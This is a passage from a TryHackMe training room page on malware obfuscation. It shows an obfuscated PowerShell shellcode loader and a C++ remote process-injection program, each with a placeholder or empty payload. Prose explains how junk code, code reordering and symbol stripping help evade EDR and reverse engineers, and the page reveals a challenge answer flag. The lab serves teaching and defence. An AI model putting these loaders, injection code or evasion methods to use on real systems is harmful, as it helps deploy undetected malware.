<span class="token namespace">[Byte[]]</span> <span class="token variable">$AD0Pi</span> = @<span class="token punctuation">(</span>0x41<span class="token punctuation">,</span> 0x54<span class="token punctuation">,</span> 0x5d<span class="token punctuation">,</span> 0x5f<span class="token punctuation">,</span> 0x60<span class="token punctuation">,</span> 0x4c<span class="token punctuation">,</span> 0x57<span class="token punctuation">,</span> 0x2c<span class="token punctuation">,</span> 0x57<span class="token punctuation">,</span> 0x57<span class="token punctuation">,</span> 0x5a<span class="token punctuation">,</span> 0x4e<span class="token punctuation">)</span>
<span class="token namespace">[Byte[]]</span> <span class="token variable">$ahb3O</span> = @<span class="token punctuation">(</span>0x41<span class="token punctuation">,</span> 0x54<span class="token punctuation">,</span> 0x5d<span class="token punctuation">,</span> 0x5f<span class="token punctuation">,</span> 0x60<span class="token punctuation">,</span> 0x4c<span class="token punctuation">,</span> 0x57<span class="token punctuation">,</span> 0x3b<span class="token punctuation">,</span> 0x5d<span class="token punctuation">,</span> 0x5a<span class="token punctuation">,</span> 0x5f<span class="token punctuation">,</span> 0x50<span class="token punctuation">,</span> 0x4e<span class="token punctuation">,</span> 0x5f<span class="token punctuation">)</span>
<span class="token namespace">[Byte[]]</span> <span class="token variable">$yhe4c</span> = @<span class="token punctuation">(</span>0x2E<span class="token punctuation">,</span> 0x5D<span class="token punctuation">,</span> 0x50<span class="token punctuation">,</span> 0x4C<span class="token punctuation">,</span> 0x5F<span class="token punctuation">,</span> 0x50<span class="token punctuation">,</span> 0x3F<span class="token punctuation">,</span> 0x53<span class="token punctuation">,</span> 0x5D<span class="token punctuation">,</span> 0x50<span class="token punctuation">,</span> 0x4C<span class="token punctuation">,</span> 0x4F<span class="token punctuation">)</span>

<span class="token keyword">function</span> <span class="token function">Get-Robf</span> <span class="token punctuation">(</span><span class="token variable">$b3tz</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$aisN</span> = <span class="token namespace">[System.Byte[]]</span>::new<span class="token punctuation">(</span><span class="token variable">$b3tz</span><span class="token punctuation">.</span>Count<span class="token punctuation">)</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$x</span> = 0<span class="token punctuation">;</span> <span class="token variable">$x</span> <span class="token operator">-lt</span> <span class="token variable">$aisN</span><span class="token punctuation">.</span>Count<span class="token punctuation">;</span> <span class="token variable">$x</span>+<span class="token operator">+</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
       <span class="token variable">$aisN</span><span class="token punctuation">[</span><span class="token variable">$x</span><span class="token punctuation">]</span> = <span class="token punctuation">(</span><span class="token variable">$b3tz</span><span class="token punctuation">[</span><span class="token variable">$x</span><span class="token punctuation">]</span> <span class="token operator">+</span> 21<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token namespace">[System.Text.Encoding]</span>::ASCII<span class="token punctuation">.</span>GetString<span class="token punctuation">(</span><span class="token variable">$aisN</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function">Get-PA</span> <span class="token punctuation">(</span><span class="token variable">$vmod</span><span class="token punctuation">,</span> <span class="token variable">$vproc</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$a</span> = <span class="token punctuation">(</span><span class="token namespace">[AppDomain]</span>::CurrentDomain<span class="token punctuation">.</span>GetAssemblies<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Where-Object</span> <span class="token punctuation">{</span> <span class="token variable">$_</span><span class="token punctuation">.</span>GlobalAssemblyCache <span class="token operator">-And</span> <span class="token variable">$_</span><span class="token punctuation">.</span>Location<span class="token punctuation">.</span>Split<span class="token punctuation">(</span><span class="token string">'\\\\'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span>1<span class="token punctuation">]</span><span class="token punctuation">.</span>Equals<span class="token punctuation">(</span><span class="token string">'System.dll'</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>GetType<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">Get-Robf</span> <span class="token variable">$KooG5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">.</span>GetMethod<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">Get-Robf</span> <span class="token variable">$io9iH</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token namespace">[reflection.bindingflags]</span> <span class="token string">"Public,Static"</span><span class="token punctuation">,</span> <span class="token variable">$null</span><span class="token punctuation">,</span> <span class="token namespace">[System.Reflection.CallingConventions]</span>::Any<span class="token punctuation">,</span> @<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">New-Object</span> System<span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span>InteropServices<span class="token punctuation">.</span>HandleRef<span class="token punctuation">)</span><span class="token punctuation">.</span>GetType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token namespace">[string]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$null</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$null</span><span class="token punctuation">,</span> @<span class="token punctuation">(</span><span class="token namespace">[System.Runtime.InteropServices.HandleRef]</span><span class="token punctuation">(</span><span class="token function">New-Object</span> System<span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span>InteropServices<span class="token punctuation">.</span>HandleRef<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">New-Object</span> IntPtr<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">.</span>GetMethod<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">Get-Robf</span> <span class="token variable">$Qui5i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$null</span><span class="token punctuation">,</span> @<span class="token punctuation">(</span><span class="token variable">$vmod</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$vproc</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function">Get-TDef</span> <span class="token punctuation">{</span>
    <span class="token keyword">Param</span> <span class="token punctuation">(</span>
        <span class="token namespace">[Parameter(Position = 0, Mandatory = $True)]</span> <span class="token namespace">[Type[]]</span> <span class="token variable">$var_parameters</span><span class="token punctuation">,</span>
        <span class="token namespace">[Parameter(Position = 1)]</span> <span class="token namespace">[Type]</span> <span class="token variable">$var_return_type</span> = <span class="token namespace">[Void]</span>
    <span class="token punctuation">)</span>
    <span class="token variable">$vtdef</span> = <span class="token namespace">[AppDomain]</span>::CurrentDomain<span class="token punctuation">.</span>DefineDynamicAssembly<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">New-Object</span> System<span class="token punctuation">.</span>Reflection<span class="token punctuation">.</span>AssemblyName<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">Get-Robf</span> <span class="token variable">$Ait1m</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token namespace">[System.Reflection.Emit.AssemblyBuilderAccess]</span>::Run<span class="token punctuation">)</span><span class="token punctuation">.</span>DefineDynamicModule<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">Get-Robf</span>  <span class="token variable">$ahv3I</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">$false</span><span class="token punctuation">)</span><span class="token punctuation">.</span>DefineType<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">Get-Robf</span> <span class="token variable">$Moo5y</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token function">Get-Robf</span> <span class="token variable">$ooR5o</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token namespace">[System.MulticastDelegate]</span><span class="token punctuation">)</span>
    <span class="token variable">$vtdef</span><span class="token punctuation">.</span>DefineConstructor<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">Get-Robf</span> <span class="token variable">$Reib3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token namespace">[System.Reflection.CallingConventions]</span>::Standard<span class="token punctuation">,</span> <span class="token variable">$var_parameters</span><span class="token punctuation">)</span><span class="token punctuation">.</span>SetImplementationFlags<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">Get-Robf</span> <span class="token variable">$Reo5o</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token variable">$vtdef</span><span class="token punctuation">.</span>DefineMethod<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">Get-Robf</span> <span class="token variable">$ii5Ie</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token function">Get-Robf</span> <span class="token variable">$Thah8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$var_return_type</span><span class="token punctuation">,</span> <span class="token variable">$var_parameters</span><span class="token punctuation">)</span><span class="token punctuation">.</span>SetImplementationFlags<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">Get-Robf</span> <span class="token variable">$Reo5o</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token variable">$vtdef</span><span class="token punctuation">.</span>CreateType<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token namespace">[Byte[]]</span><span class="token variable">$vopcode</span> = @<span class="token punctuation">(</span>BADGER_SHELLCODE<span class="token punctuation">)</span>

<span class="token variable">$vbuf</span> = <span class="token punctuation">(</span><span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">Get-PA</span> <span class="token punctuation">(</span><span class="token function">Get-Robf</span> <span class="token variable">$xee2N</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token function">Get-Robf</span> <span class="token variable">$AD0Pi</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token function">Get-TDef</span> @<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">,</span> <span class="token variable">$vopcode</span><span class="token punctuation">.</span>Length<span class="token punctuation">,</span> 0x3000<span class="token punctuation">,</span> 0x04<span class="token punctuation">)</span>
<span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::<span class="token function">Copy</span><span class="token punctuation">(</span><span class="token variable">$vopcode</span><span class="token punctuation">,</span> 0x0<span class="token punctuation">,</span> <span class="token variable">$vbuf</span><span class="token punctuation">,</span> <span class="token variable">$vopcode</span><span class="token punctuation">.</span>length<span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">Get-PA</span> <span class="token punctuation">(</span><span class="token function">Get-Robf</span> <span class="token variable">$xee2N</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token function">Get-Robf</span> <span class="token variable">$ahb3O</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token function">Get-TDef</span> @<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[Bool]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$vbuf</span><span class="token punctuation">,</span> <span class="token variable">$vopcode</span><span class="token punctuation">.</span>Length<span class="token punctuation">,</span> 0x20<span class="token punctuation">,</span> <span class="token namespace">[ref]</span><span class="token punctuation">(</span>0<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
<span class="token punctuation">(</span><span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">Get-PA</span> <span class="token punctuation">(</span><span class="token function">Get-Robf</span> <span class="token variable">$xee2N</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token function">Get-Robf</span> <span class="token variable">$yhe4c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token function">Get-TDef</span> @<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[UInt32]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span>0<span class="token punctuation">,</span> 0<span class="token punctuation">,</span> <span class="token variable">$vbuf</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span>0<span class="token punctuation">,</span> 0<span class="token punctuation">,</span> <span class="token namespace">[ref]</span><span class="token punctuation">(</span>0<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
</code></pre><p><span>You may notice that some cmdlets and functions are kept in their original state… why is that? Depending on your objectives, you may want to create an application that can still confuse reverse engineers after detection but may not look immediately suspicious. If a malware developer were to obfuscate all cmdlets and functions, it would raise the <a class="cSVUFbL4 glossary-term" onclick="initPopOver(&#39;entropy&#39;, &#39;cSVUFbL4&#39;)">entropy</a> in both interpreted and compiled languages resulting in higher EDR alert scores. It could also lead to an interpreted snippet appearing suspicious in logs if it is seemingly random or visibly heavily obfuscated.</span></p><h3><span style="font-size:24px">Code Structure</span></h3><p>Code structure can be a bothersome problem when dealing with all aspects of malicious code that are often overlooked and not easily identified. If not adequately addressed in both interpreted and compiled languages, it can lead to signatures or easier reverse engineering from an analyst.</p><p>As covered in the aforementioned taxonomy paper,&nbsp;<strong>junk code</strong> and&nbsp;<strong>reordering code</strong> are both widely used as additional measures to add complexity to an interpreted program. Because the program is not compiled, an analyst has much greater insight into the program, and if not artificially inflated with complexity, they can focus on the exact malicious functions of an application.</p><p>Separation of related code can impact both interpreted and compiled languages and result in hidden signatures that may be hard to identify. A heuristic signature engine may determine whether a program is malicious based on the surrounding functions or API calls. To circumvent these signatures, an attacker can randomize the occurrence of related code to fool the engine into believing it is a safe call or function.</p><h3><span style="font-size:24px">File &amp; Compilation Properties</span>



</h3><p>More minor aspects of a compiled binary, such as the compilation method, may not seem like a critical component, but they can lead to several advantages to assist an analyst. For example, if a program is compiled as a debug build, an analyst can obtain all the available global variables and other program information.</p><p>The compiler will include a symbol file when a program is compiled as a debug build. Symbols commonly aid in debugging a binary image and can contain global and local variables, function names, and entry points. Attackers must be aware of these possible problems to ensure proper compilation practices and that no information is leaked to an analyst.</p><p>Luckily for attackers, symbol files are easily removed through the compiler or after compilation. To remove symbols from a compiler like&nbsp;<strong>Visual Studio</strong>, we need to change the compilation target from <code>Debug</code> to <code>Release</code> or use a lighter-weight compiler like&nbsp;<strong>mingw.</strong></p><p>If we need to remove symbols from a pre-compiled image, we can use the command-line utility: <code>strip</code>.</p><p>The aforementioned white paper:&nbsp;<a href="https://cybersecurity.springeropen.com/articles/10.1186/s42400-020-00049-3">Layered Obfuscation Taxonomy</a>, summarizes these practices well under the&nbsp;<strong>code-element</strong> layer’s&nbsp;<strong>stripping redundant symbols</strong> method.</p><p>Below is an example of using strip to remove the symbols from a binary compiled in&nbsp;<strong>gcc</strong> with debugging enabled.</p>
<asciinema-player src="https://asciinema.org/a/510731.cast" cols="160" rows="24"><div data-reactroot="" tabindex="-1" class="asciinema-player-wrapper hud"><div class="asciinema-player asciinema-theme-asciinema"><pre class="asciinema-terminal font-small" style="width: 160ch; height: 32em;"><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span></pre><div class="control-bar"><span class="playback-button"><svg version="1.1" viewBox="0 0 12 12" class="icon"><path d="M1,0 L11,6 L1,12 Z"></path></svg></span><span class="timer"><span class="time-elapsed">00:00</span><span class="time-remaining">-00:00</span></span><span class="fullscreen-button"><svg version="1.1" viewBox="0 0 12 12" class="icon"><path d="M12,0 L7,0 L9,2 L7,4 L8,5 L10,3 L12,5 Z"></path><path d="M0,12 L0,7 L2,9 L4,7 L5,8 L3,10 L5,12 Z"></path></svg><svg version="1.1" viewBox="0 0 12 12" class="icon"><path d="M7,5 L7,0 L9,2 L11,0 L12,1 L10,3 L12,5 Z"></path><path d="M5,7 L0,7 L2,9 L0,11 L1,12 L3,10 L5,12 Z"></path></svg></span><span class="progressbar"><span class="bar"><span class="gutter"><span></span></span></span></span></div><div class="start-prompt"><div class="play-button"><div><span><svg version="1.1" viewBox="0 0 866.0254037844387 866.0254037844387" class="icon"><defs> <mask id="small-triangle-mask"> <rect width="100%" height="100%" fill="white"></rect> <polygon points="508.01270189221935 433.01270189221935, 208.0127018922194 259.8076211353316, 208.01270189221927 606.217782649107" fill="black"></polygon> </mask> </defs> <polygon points="808.0127018922194 433.01270189221935, 58.01270189221947 -1.1368683772161603e-13, 58.01270189221913 866.0254037844386" mask="url(#small-triangle-mask)" fill="white"></polygon> <polyline points="481.2177826491071 333.0127018922194, 134.80762113533166 533.0127018922194" stroke="white" stroke-width="90"></polyline></svg></span></div></div></div></div></div></asciinema-player>

<p><span>Several other properties should be considered before actively using a tool, such as <a class="ae3OXQcV glossary-term" onclick="initPopOver(&#39;entropy&#39;, &#39;ae3OXQcV&#39;)">entropy</a> or hash. These concepts are covered in task 5 of the&nbsp;</span><a href="https://tryhackme.com/room/signatureevasion">Signature Evasion room</a>.</p><hr><p>Using the knowledge you have accrued throughout this task, remove any meaningful identifiers or debug information from the C++ source code below using the AttackBox or your own virtual machine.</p><p>Once adequately obfuscated and stripped compile the source code using <code>MingW32-G++</code> and submit it to the webserver at <code>http://MACHINE_IP/</code>.
</p><p>Note: the file name must be <code>challenge-8.exe</code> to receive the flag.</p><p>


</p><pre class=" language-powershell" tabindex="0"><code class=" language-powershell"><span class="token comment">#include "windows.h"</span>
<span class="token comment">#include &lt;iostream&gt;</span>
<span class="token comment">#include &lt;string&gt;</span>
<span class="token keyword">using</span> namespace std<span class="token punctuation">;</span>

int main<span class="token punctuation">(</span>int argc<span class="token punctuation">,</span> char<span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	unsigned char shellcode<span class="token punctuation">[</span><span class="token punctuation">]</span> = <span class="token string">""</span><span class="token punctuation">;</span>

	HANDLE processHandle<span class="token punctuation">;</span>
	HANDLE remoteThread<span class="token punctuation">;</span>
	PVOID remoteBuffer<span class="token punctuation">;</span>
	string leaked = <span class="token string">"This was leaked in the strings"</span><span class="token punctuation">;</span>

	processHandle = OpenProcess<span class="token punctuation">(</span>PROCESS_ALL_ACCESS<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> DWORD<span class="token punctuation">(</span>atoi<span class="token punctuation">(</span>argv<span class="token punctuation">[</span>1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	cout &lt;&lt; <span class="token string">"Handle obtained for"</span> &lt;&lt; processHandle<span class="token punctuation">;</span>
	remoteBuffer = VirtualAllocEx<span class="token punctuation">(</span>processHandle<span class="token punctuation">,</span> NULL<span class="token punctuation">,</span> sizeof shellcode<span class="token punctuation">,</span> <span class="token punctuation">(</span>MEM_RESERVE <span class="token punctuation">|</span> MEM_COMMIT<span class="token punctuation">)</span><span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span>
	cout &lt;&lt; <span class="token string">"Buffer Created"</span><span class="token punctuation">;</span>
	WriteProcessMemory<span class="token punctuation">(</span>processHandle<span class="token punctuation">,</span> remoteBuffer<span class="token punctuation">,</span> shellcode<span class="token punctuation">,</span> sizeof shellcode<span class="token punctuation">,</span> NULL<span class="token punctuation">)</span><span class="token punctuation">;</span>
	cout &lt;&lt; <span class="token string">"Process written with buffer"</span> &lt;&lt; remoteBuffer<span class="token punctuation">;</span>
	remoteThread = CreateRemoteThread<span class="token punctuation">(</span>processHandle<span class="token punctuation">,</span> NULL<span class="token punctuation">,</span> 0<span class="token punctuation">,</span> <span class="token punctuation">(</span>LPTHREAD_START_ROUTINE<span class="token punctuation">)</span>remoteBuffer<span class="token punctuation">,</span> NULL<span class="token punctuation">,</span> 0<span class="token punctuation">,</span> NULL<span class="token punctuation">)</span><span class="token punctuation">;</span>
	CloseHandle<span class="token punctuation">(</span>processHandle<span class="token punctuation">)</span><span class="token punctuation">;</span>
	cout &lt;&lt; <span class="token string">"Closing handle"</span> &lt;&lt; processHandle<span class="token punctuation">;</span>
	cout &lt;&lt; leaked<span class="token punctuation">;</span>

	<span class="token keyword">return</span> 0<span class="token punctuation">;</span>
<span class="token punctuation">}</span> </code></pre>
</div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                What flag is found after uploading a properly obfuscated snippet?
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***{*****************}" value="THM{Y0Ur_1NF0_15_M1N3}" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="8">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        <div class="room-task-input-hint">
                            <button type="button" class="btn btn-dorange faded btn-noline task-hint" onclick="getHint(this)">
                        <i class="fal fa-lightbulb"></i> Hint
                      </button>
                        </div>
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-9">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse9">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 9                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Conclusion
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse9" class="collapse " data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p>Obfuscation can be one of the most lucrative tools in an attackers arsenal when it comes to evasion. Both attackers and defenders alike should understand and assess not only its uses but also its impacts.</p><p>In this room, we covered the principles of obfuscation as it relates to both signature evasion and anti reverse-engineering.</p><p>The techniques shown in this room are generally tool-agnostic and can be applied to many use cases as both tooling and defenses shift.</p><p>


</p><p>At this point, you can take obfuscation a step further into <a href="https://tryhackme.com/room/signatureevasion">signature evasion</a> where it is directly applied to signatures or use it at a higher-level with obfuscators.</p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                Read the above and continue learning!
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="9">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Question Done
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div></div>
</div>
<div id="room-simple-details"><div class="card cd-2 text-center mt-3"><div class="card-body"><p class="size-18">Created by <img class="avatar-tiny" src="./TryHackMe _ Obfuscation Principles_files/af7feb2c43a2c7d5f111b98ccbd15048.png"> 
        <a class="green-link" href="https://tryhackme.com/p/tryhackme">tryhackme</a> and <img class="avatar-tiny" src="./TryHackMe _ Obfuscation Principles_files/9e946af210ae86d6fbfda480d958b3fe.gif"> 
        <a class="green-link" href="https://tryhackme.com/p/Cryillic">Cryillic</a></p><p class="mb-0">Only subscribers can deploy virtual machines in this room! 
        Go to your <a href="https://tryhackme.com/profile">profile</a> page to subscribe (if you have not already). 5349 users are in here and this room is 321 days old.</p></div></div></div>

</div>
</div>
</div>
<div id="room-content-attackbox">
<div id="room-attackbox">
<div id="attackbox-machine-instance">
<div id="room-attackbox-loading"></div>
<div id="room-attackbox-vm-view"></div>
</div>
<div id="attackbox-machine-options">
<div class="d-flex">
<a target="_blank" id="room-attackbox-url" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="View in full screen"></a>
<div onclick="extendHourWebBasedVM(null)" class="hover-pointer" id="room-attackbox-extend" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Extend machines timer"><i class="fas fa-plus"></i></div>
<div onclick="terminateWebBasedVM(null)" class="hover-pointer" id="room-attackbox-terminate" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Terminate Machine"><i class="far fa-power-off"></i></div>
<div onclick="exitViewAttackBox()" class="hover-pointer" id="room-attackbox-exitview" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Exit split view"><i class="fas fa-minus"></i></div>
<div onclick="infoAttackBox()" class="hover-pointer faded" id="room-attackbox-info" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Machine Information"><i class="fas fa-info"></i></div>
<div class="d-flex" id="room-attackbox-tabs"></div>
</div>
<div id="room-attackbox-expire-text" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Time left until your AttackBox expires"></div>
</div>
</div>
<div class="modal fade" id="attackBoxInfoModal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header modal-light-gray">
<h5 class="modal-title m-auto">Web-Based Machine Information</h5>
</div>
<div class="modal-body">
<p>Use the web-based machine to attack other target machines you start on TryHackMe.</p>
<ul class="normalList text-gray mt-3 mb-4">
<li>Public IP: <code id="browser-machine-pubip" class="dark size-14"></code></li>
<li class="mt-1">Private IP: <code id="browser-machine-privip" class="dark size-14"></code> <span class="size-14">(Use this for your reverse shells)</span></li>
<li class="mt-1">Username: <code id="browser-username" class="dark size-14"></code></li>
<li class="mt-1">Password: <code id="browser-password" class="dark size-14"></code></li>
<li class="mt-1">Protocol: <code id="browser-protocol" class="dark size-14"></code></li>
</ul>
<hr class="hr-min">
<ul class="text-lgray mb-0">
<li class="mt-2">To copy to and from the browser-based machine, highlight the text and press <b>CTRL+SHIFT+C</b> <details><summary>or use the clipboard</summary><img src="./TryHackMe _ Obfuscation Principles_files/clipboard.gif"></details></li>
<li class="mt-2">When accessing target machines you start on TryHackMe tasks, make sure you're using the correct IP (it <b>should not be</b> the IP of your AttackBox)</li>
</ul>
</div>
</div>
</div>
</div>
</div>
<div class="modal fade" id="award-modal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-body text-center">
<button type="button" class="close size-30 text-lgray" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
<div id="award-modal-badges"></div>
<p class="mb-0 text-lgray size-18">Complete the room to earn this badge</p>
</div>
</div>
</div>
</div>
<div class="modal fade" id="hint-modal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue">
<h5 class="modal-title"><i class="fal fa-lightbulb-on"></i> Question Hint</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body"></div>
</div>
</div>
</div>
<div class="modal fade" id="modal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header">
<h5 class="modal-title">...</h5>
